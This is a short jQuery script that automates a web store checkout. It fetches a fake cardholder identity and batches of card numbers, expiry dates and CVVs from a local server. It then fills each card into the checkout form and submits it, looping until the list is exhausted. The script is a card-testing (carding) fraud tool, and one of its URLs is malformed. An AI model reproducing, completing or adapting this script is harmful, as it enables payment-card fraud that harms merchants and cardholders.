var baseUrl = "localhost";
var postUrl = "http://" + baseUrl + ":5000/post";
var fakeUrl = "http://" + baseUrl + "localhost:5000/fake?city=Miami&callback=fake";
var iteration = null;
var options = {
     url:fakeUrl,
     dataType: "jsonp"
};
var cards = function(arr) {
	var i = 0;
	var len = arr.length;

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i++];
	    sessionStorage.card = JSON.stringify( json );

	    $("#checkout_credit_card_number").val(json.card);
	    $("#checkout_credit_card_expiry").val(json.mon + " / " + json.year);
	    $("#checkout_credit_card_verification_value").val(json.cvv);
	    
	    $($("button[type=submit]")[2]).click();
	  }
	  else {
	    $.ajax(options)
	    .success(cards);
	  }

	}

	iteration();
};
var fake = function( person ) {
	console.log( person.fullname );

	$("#checkout_credit_card_name").val( person.firstname + " " + person.lastname );

	options.url = postUrl;
	$.ajax(options)
	.success(cards);;
}
// V2
$.ajax(options)
.success(fake);